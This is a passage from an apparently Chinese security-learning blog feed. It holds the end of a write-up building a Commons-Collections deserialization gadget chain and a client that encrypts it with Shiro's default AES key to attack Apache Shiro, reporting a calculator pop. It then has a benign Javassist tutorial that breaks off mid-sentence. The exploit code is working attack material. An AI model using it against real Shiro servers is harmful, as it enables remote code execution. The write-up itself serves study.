class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;<span class="hljs-string">&quot;...bytescode&quot;</span>&#125;);<br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一个人畜无害的方法，比如 getClass ，避免恶意方法在构造Gadget的时候触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>再把老的<code>CommonsCollections6</code>的代码复制过来，然后改上一节说到的点，就是将原来<code>TiedMapEntry</code>构造时的第二个参数<code>key</code>，改为前面创建的 <code>TemplatesImpl</code> 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, obj);<br><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>outerMap.clear();<br></code></pre></td></tr></table></figure><p>和我之前的<code>CommonsCollections6</code>稍有不同的是，我之前是使用 <code>outerMap.remove(&quot;keykey&quot;);</code> 来移除key的副作用，现在是通过 <code>outerMap.clear();</code> ，效果相同。</p><p>最后，将 <code>InvokerTransformer</code> 的方法从人畜无害的 <code>getClass</code> ，改成 <code>newTransformer</code> ，正式完成武器装配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollectionsShiro</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, obj);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br><br>        outerMap.clear();<br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="攻击Shiro"><a href="#攻击Shiro" class="headerlink" title="攻击Shiro"></a>攻击Shiro</h2><p>使用JavaThings里面的Client来装配payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.shiroattack;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(com.govuln.shiroattack.Evil.class.getName());<br>        <span class="hljs-comment">//这里的Javassist就是应用了ClassPool，主要用来帮助我将恶意类com.govuln.shiroattack.Evil 生成字节码再交给 TemplatesImpl</span><br>        <span class="hljs-type">byte</span>[] payloads = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsCollectionsShiro</span>().getPayload(clazz.toBytecode());<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230403185241271.png" alt="image-20230403185241271"> </p><p>如此以来成功弹出计算器</p><blockquote><p>之前没有办法弹出计算器的原因找到了，因为那个网站只接受一次登录数据，如果再次登录不管点什么都没有反映了</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Javasist</title>
    <link href="/decemberus.com/2023/04/02/Javasist/"/>
    <url>/decemberus.com/2023/04/02/Javasist/</url>
    
    <content type="html"><![CDATA[<h1 id="Javasist"><a href="#Javasist" class="headerlink" title="Javasist"></a>Javasist</h1><p>参考<a href="https://www.javassist.org/tutorial/tutorial.html">Javassist Tutorial</a></p><h2 id="创建Class"><a href="#创建Class" class="headerlink" title="创建Class"></a>创建Class</h2><p>maven</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javassist/javassist --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.12.1.GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用javassist来创建一个Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.y4er.learn;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 获取javassist维护的类池</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>        <span class="hljs-comment">// 创建一个空类first_learn,类名为person</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;com.y4er.learn.Person&quot;</span>);<br><br>        <span class="hljs-comment">// 给ctClass类添加一个string类型的字段为name</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br><br>        <span class="hljs-comment">// 设置private权限</span><br>        name.setModifiers(Modifier.PRIVATE);<br><br>        <span class="hljs-comment">// 初始化name字段为zhangsan</span><br>        ctClass.addField(name, CtField.Initializer.constant(<span class="hljs-string">&quot;zhangsan&quot;</span>));<br><br>        <span class="hljs-comment">// 生成get、set方法</span><br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>,name));<br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>,name));<br><br>        <span class="hljs-comment">// 添加无参构造函数</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name=\&quot;xiaoming\&quot;;&#125;&quot;</span>);<br>        ctClass.addConstructor(ctConstructor);<br><br>        <span class="hljs-comment">// 添加有参构造</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<br>        ctConstructor1.setBody(<span class="hljs-string">&quot;&#123;$0.name=$1;&#125;&quot;</span>);<br>        ctClass.addConstructor(ctConstructor1);<br><br>        <span class="hljs-comment">// 创建一个public方法printName() 无参无返回值</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">printName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        printName.setModifiers(Modifier.PUBLIC);<br>        printName.setBody(<span class="hljs-string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);<br>        ctClass.addMethod(printName);<br><br>        <span class="hljs-comment">// 写入class文件</span><br>        ctClass.writeFile();<br>        ctClass.detach();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行以后生成了Person.class</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230513191417751.png" alt="image-20230513191417751"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230513191425024.png" alt="image-20230513191425024"> </p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>从上文的demo中可以看到部分使用方法，在javassist中CtClass代表的就是类class，ClassPool就是CtClass的容器，ClassPool维护了所有创建的CtClass对象，需要注意的是当CtClass数量过大会占用大量内存，需要调用CtClass.detach()释放内存。</p><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>ClassPool重点有以下几个方法：</p><ol><li><p>getDefault() 单例获取ClassPool</p></li><li><p>appendClassPath() 将目录添加到ClassPath</p></li><li><p>insertClassPath() 在ClassPath插入jar</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassPool pool <span class="hljs-operator">=</span> ClassPool.getDefault()<span class="hljs-comment">;</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/usr/local/javalib&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>同时也可以是URL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.javassist.org&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/java/&quot;</span>, <span class="hljs-string">&quot;org.javassist.&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><p>同样可以是一个字节码（没明白）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] b = a <span class="hljs-type">byte</span> array;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">name</span>;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, b));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure></li><li><p>get() 根据名称获取CtClass对象</p><p>在get的时候可以先<code>appendClassPath()</code></p></li><li><p>toClass() 将CtClass转为Class 一旦被转换则不能修改</p></li><li><p>makeClass() 创建新的类或接口</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">CtClass ctClass <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;com.y4er.learn.Person&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ol><p>​</p><p>更多移步官方文档：<a href="http://www.javassist.org/html/javassist/ClassPool.html">http://www.javassist.org/html/javassist/ClassPool.html</a></p><p>除了可以通过getDefault的方法获取ClassPool之外，还可以通过</p><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClass需要关注的方法：</p><ol><li><p>addConstructor() 添加构造函数</p></li><li><p>addField() 添加字段</p></li><li><p>addInterface() 添加接口</p></li><li><p>addMethod() 添加方法</p><p>上面那四个方法都可以参照反射的方法去做</p></li><li><p>freeze() 冻结类使其不能被修改</p></li><li><p>defrost() 解冻使其能被修改</p></li><li><p>detach() 从ClassPool中删除类</p></li><li><p>toBytecode() 转字节码</p></li><li><p>toClass() 转Class对象</p></li><li><p>writeFile() 写入.class文件</p></li><li><p>setModifiers() 设置修饰符</p></li></ol><p>移步：<a href="http://www.javassist.org/html/javassist/CtClass.html">http://www.javassist.org/html/javassist/CtClass.html</a></p><h3 id="CtMehod"><a href="#CtMehod" class="headerlink" title="CtMehod"></a>CtMehod</h3><p>CtMethod继承CtBehavior，需要关注的方法：</p><ol><li>insertBefore 在方法的起始位置插入代码</li><li>insterAfter 在方法的所有 return 语句前插入代码</li><li>insertAt 在指定的位置插入代码</li><li>setBody 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除</li><li>make 创建一个新的方法</li></ol><p>更多移步：<a href="http://www.javassist.org/html/javassist/CtBehavior.html">http://www.javassist.org/html/javassist/CtBehavior.html</a></p><h2 id="使用CtClass生成对象"><a href="#使用CtClass生成对象" class="headerlink" title="使用CtClass生成对象"></a>使用CtClass生成对象</h2><p>类加载的一个tip</p><h3 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 实例化</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ctClass.toClass().newInstance();<br><span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>setName.invoke(o,<span class="hljs-string">&quot;Y4er&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">printName1</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>printName1.invoke(o);<br><br></code></pre></td></tr></table></figure><h3 id="加载class文件"><a href="#加载class文件" class="headerlink" title="加载class文件"></a>加载class文件</h3><h4 id="加载文件的提示"><a href="#加载文件的提示" class="headerlink" title="加载文件的提示"></a>加载文件的提示</h4><p>如果同一个类文件由两个不同的类加载器加载，则JVM会使用相同的名称和定义创建两个不同的类。这两个类被视为不同的类。由于这两个类不相同，因此一个类的实例不能赋值给另一个类的变量。在这两个类之间的强制转换操作失败并抛出ClassCastException异常。</p><p>例如这个代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyClassLoader</span> <span class="hljs-variable">myLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClassLoader</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> myLoader.loadClass(<span class="hljs-string">&quot;Box&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> clazz.newInstance();<br><span class="hljs-type">Box</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> (Box)obj; <span class="hljs-comment">// 这总是抛出ClassCastException异常。</span><br></code></pre></td></tr></table></figure><p>Box类由两个类加载器加载。假设一个类加载器CL加载了一个包含此代码段的类。由于此代码段引用了MyClassLoader、Class、Object和Box，CL也会加载这些类（除非它委托给另一个类加载器）。因此，变量b的类型是由CL加载的Box类。另一方面，myLoader也加载了Box类。对象obj是由myLoader加载的Box类的实例。因此，最后一个语句总是会抛出ClassCastException异常，因为obj的类是与变量b的类型所使用的Box类的不同版本。</p><p>直接看下面的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Point</span> &#123;    <span class="hljs-comment">// loaded by PL</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getX</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> x; &#125;<br>        :<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span> &#123;      <span class="hljs-comment">// the initiator is L but the real loader is PL</span><br>    <span class="hljs-keyword">private</span> Point upperLeft, size;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBaseX</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> upperLeft.x; &#125;<br>        :<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Window</span> &#123;    <span class="hljs-comment">// loaded by a class loader L</span><br>    <span class="hljs-keyword">private</span> Box box;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBaseX</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> box.getBaseX(); &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>假设一个类Window是由类加载器L加载的。Window的发起者和真实加载器都是L。由于Window的定义引用了Box类，JVM会请求L来加载Box。在这种情况下，假设L将这个任务委托给了父类加载器PL。Box的发起者是L，但是真实加载器是PL。在这种情况下，Point的发起者不是L，而是PL，因为它与Box的真实加载器相同。因此，L不需要加载Point。</p><p>在看一个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Point</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getX</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> x; &#125;<br>        :<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span> &#123;      <span class="hljs-comment">// the initiator is L but the real loader is PL</span><br>    <span class="hljs-keyword">private</span> Point upperLeft, size;<br>    <span class="hljs-keyword">public</span> Point <span class="hljs-title function_">getSize</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> size; &#125;<br>        :<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Window</span> &#123;    <span class="hljs-comment">// loaded by a class loader L</span><br>    <span class="hljs-keyword">private</span> Box box;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">widthIs</span><span class="hljs-params">(<span class="hljs-type">int</span> w)</span> &#123;<br>        <span class="hljs-type">Point</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> box.getSize();<br>        <span class="hljs-type">return</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span>= p.getX();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，Window 的定义也引用了 Point。在这种情况下，当 L 被请求加载 Point 时，它也必须委派给 